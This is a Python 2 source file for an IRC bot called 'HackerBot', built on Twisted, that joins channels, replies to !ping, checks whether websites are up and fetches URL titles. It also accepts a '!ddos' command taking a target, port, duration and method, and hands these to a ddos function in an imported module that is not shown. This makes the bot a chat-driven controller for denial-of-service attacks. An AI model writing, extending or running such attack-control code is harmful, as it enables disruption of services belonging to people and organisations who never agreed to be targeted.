import time
import sys
import commands
import re
from twisted.words.protocols import irc
from twisted.internet import reactor, protocol
from twisted.python import log

class HackerBot(irc.IRCClient):
    nickname = "hackerbot"

    def connectionMade(self):
        irc.IRCClient.connectionMade(self)

    def connectionLost(self, reason):
        irc.IRCClient.connectionLost(self, reason)

    def signedOn(self):
        for channel in self.factory.channels:
            self.join(channel)

    def privmsg(self, user, channel, msg):
        user = user.split('!', 1)[0]

        if msg.startswith("!ping"):
            self.msg(channel, "pong")
            return

        if msg.startswith("!up"):
            try:
                website = msg.split(" ")[1]
                self.msg(channel, "[-] Checking if %s is up.."%website)
                self.msg(channel, commands.isItUp(website))
                return
            except:
                self.msg(channel, "[!] Failed to check if website was up..")
                return

        if msg.startswith("!ddos"):
            args = msg.split(" ")
            target = args[1]
            port = args[2]
            time = args[3]
            method = args[4].upper()
            self.msg(channel, commands.ddos(target, port, time, method))

        for url in re.findall(r"https?://.*/.*\b", msg):
            try:
                websiteTitle = commands.websiteTitle(url)
                if len(url) > 55:
                    url = url[0:55]
                message = "(%s) - %s"%(url, websiteTitle)
                self.msg(channel, message)
            except:
                continue

        return

    def action(self, user, channel, msg):
        user = user.split('!', 1)[0]

    def irc_NICK(self, prefix, params):
        old_nick = prefix.split('!')[0]
        new_nick = params[0]

    def alterCollidedNick(self, nickname):
        return nickname + '^'

class HackerBotFactory(protocol.ClientFactory):
    def __init__(self, channel):
        self.channels = channel.split(",")

    def buildProtocol(self, addr):
        p = HackerBot()
        p.factory = self
        return p

    def clientConnectionLost(self, connector, reason):
        connector.connect()

    def clientConnectionFailed(self, connector, reason):
        print "connection failed:", reason
        reactor.stop()

if __name__ == '__main__':
    global nickname
    config = open('config', 'r').read().strip().split(":")
    log.startLogging(sys.stdout)
    f = HackerBotFactory(config[2])
    reactor.connectTCP(config[0], int(config[1]), f)
    reactor.run()
